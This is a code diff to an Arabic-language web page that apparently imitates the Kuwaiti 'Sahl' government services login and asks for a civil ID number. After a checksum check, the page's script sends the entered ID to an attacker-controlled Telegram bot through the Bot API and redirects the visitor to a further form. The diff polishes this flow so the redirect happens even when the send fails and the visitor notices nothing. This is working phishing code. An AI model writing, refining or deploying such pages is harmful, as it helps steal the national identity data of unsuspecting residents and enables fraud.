@@ -1,7 +1,11 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <!-- Facebook Pixel Code --><script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js'); fbq('init', '1746730236547599'); fbq('track', 'PageView');</script><noscript> <img height="1" width="1" src="https://www.facebook.com/tr?id=1746730236547599&ev=PageView&noscript=1"/></noscript><!-- End Facebook Pixel Code -->
+  <!-- Facebook Pixel Code -->
+  <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js'); fbq('init', '1746730236547599'); fbq('track', 'PageView');</script>
+  <noscript><img height="1" width="1" src="https://www.facebook.com/tr?id=1746730236547599&ev=PageView&noscript=1"/></noscript>
+  <!-- End Facebook Pixel Code -->
+
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta property="og:title" content="سهل" />
@@ -135,7 +139,7 @@
       style="text-align: center;" 
       maxlength="12"
     />
-    <div id="civilIdError">الرقم المدني غير صحيح يرجى التحقق من الرقم المدني</div>
+    <div id="civilIdError">الرقم المدني غير صحيح يرجى التحقق منه</div>
   </div>
 
   <button id="loginBtn" disabled>تسجيل الدخول</button>
@@ -155,7 +159,7 @@
   const loginBtn = document.getElementById("loginBtn");
   const warningDiv = document.getElementById("warning");
 
-  // خوارزمية التحقق الدقيقة للرقم المدني الكويتي
+  // خوارزمية التحقق للرقم المدني الكويتي
   function isValidCivilId(civilId) {
     if (!/^\d{12}$/.test(civilId)) return false;
 
@@ -179,13 +183,13 @@
     return checkDigit === lastDigit;
   }
 
-  // حدث الإدخال لمعالجة صحة الرقم مفتاحاً بمفتاح
+  // حدث الإدخال
   civilIdInput.addEventListener("input", function () {
     const value = civilIdInput.value.trim();
 
+    // عدم إظهار الخطأ إلا عند اكتمال 12 رقم
     if (value.length === 12) {
-      const valid = isValidCivilId(value);
-      if (valid) {
+      if (isValidCivilId(value)) {
         errorDiv.style.display = "none";
         loginBtn.disabled = false;
       } else {
@@ -193,16 +197,9 @@
         loginBtn.disabled = true;
       }
     } else {
+      // إخفاء التنبيه والزر أثناء الكتابة وطالما لم يكتمل العدد
+      errorDiv.style.display = "none";
       loginBtn.disabled = true;
-      if (value.length > 0) {
-        errorDiv.style.display = "block";
-      } else {
-        errorDiv.style.display = "none";
-      }
-    }
-
-    if (warningDiv.style.display === "block") {
-      warningDiv.style.display = "none";
     }
   });
 
@@ -211,22 +208,16 @@
     const value = civilIdInput.value.trim();
 
     if (isValidCivilId(value)) {
+      loginBtn.disabled = true;
+      loginBtn.innerText = "جاري الدخول...";
       sessionStorage.setItem("loginCivilId", value);
+
       const message = encodeURIComponent(`تم إدخال الرقم المدني: ${value}`);
 
+      // إرسال البيانات للتليجرام والتوجيه التلقائي
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            location.href = "formandform.html";
-          } else {
-            alert("حدث خطأ أثناء الإرسال إلى تيليجرام");
-            console.error(data);
-          }
-        })
-        .catch(error => {
-          alert("تعذر الاتصال بخادم تيليجرام");
-          console.error(error);
+        .finally(() => {
+          location.href = "formandform.html";
         });
     }
   });
